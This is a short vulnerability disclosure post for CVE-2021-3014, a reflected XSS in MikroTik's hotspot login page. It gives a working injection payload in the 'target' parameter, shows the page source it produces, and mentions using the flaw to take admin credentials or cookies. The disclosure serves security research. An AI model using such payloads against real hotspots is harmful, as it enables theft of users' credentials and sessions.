---
layout: post
title:  "CVE-2021-3014 - MikroTik hotspot login XSS"
description: MikroTik hotspot login page is vulnerable to XSS-Reflected
Tags: exploits bugbounty
---

**Author** Mohammed Al-Barbari aka [@m4dm0e](https://twitter.com/m4dm0e)

**CVE-ID:** `CVE-2021-3014`

**Summary:** There is XSS-Reflected at the Mikrotik hotspot login page.

![image](../../../assets/images/Screenshot_2021-01-04_20-35-15.png)

**Description:** In the hotspot login page there is hidden input called `target` with a blank value so you can add any value into it just by adding a new parameter with the value you want and it will be reflected in the page source
e.g: `c.net/login?target=HelloAll`

source code :
```html
<input type="text" name="target" value="HelloAll" />
```

but also there are no filters over there so, you can escape the input tag and start a new value e.g: `?target=hhh" onSubmit="alert(0)`

page source : 
```html
<input type="text" name="target" value="hhh" onSubmit="alert(0)" />
```
after the victim clicks on the submit button the XSS fires!

![image](../../../assets/images/Screenshot_2021-01-04_20-34-48.png)


**How to exploit this?** 
Well, you have to be in the same network so you can play with this to get the admin user and password or cookies! also the users, with many techniques 

**PoC** 
There is a POC video that will share as soon as possible on my channel [GrodRiket Security](https://www.youtube.com/c/itgeeks)

